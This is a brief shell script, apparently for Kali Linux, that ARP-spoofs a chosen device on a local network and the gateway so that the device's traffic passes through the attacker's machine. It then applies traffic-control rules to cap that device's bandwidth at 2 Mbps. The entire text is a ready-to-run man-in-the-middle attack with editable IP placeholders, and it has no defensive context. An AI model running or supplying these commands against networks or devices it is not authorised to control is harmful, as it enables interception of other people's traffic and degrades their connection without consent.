# Find your interface (likely wlan0 for WiFi, eth0 for Ethernet)
INTERFACE="wlan0"  # Change based on your setup
KALI_IP="192.168.68.75"  # Your Kali IP
GATEWAY="192.168.68.1"

# Method A: Limit specific devices (e.g., phone at 192.168.68.100)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Spoof ARP for the target device
sudo arpspoof -i $INTERFACE -t 192.168.68.100 $GATEWAY &
sudo arpspoof -i $INTERFACE -t $GATEWAY 192.168.68.100 &

# Throttle target to 2Mbps
sudo tc qdisc add dev $INTERFACE root handle 1: htb default 30
sudo tc class add dev $INTERFACE parent 1: classid 1:1 htb rate 2mbit ceil 2mbit
sudo tc filter add dev $INTERFACE protocol ip parent 1:0 prio 1 u32 match ip dst 192.168.68.100 flowid 1:1
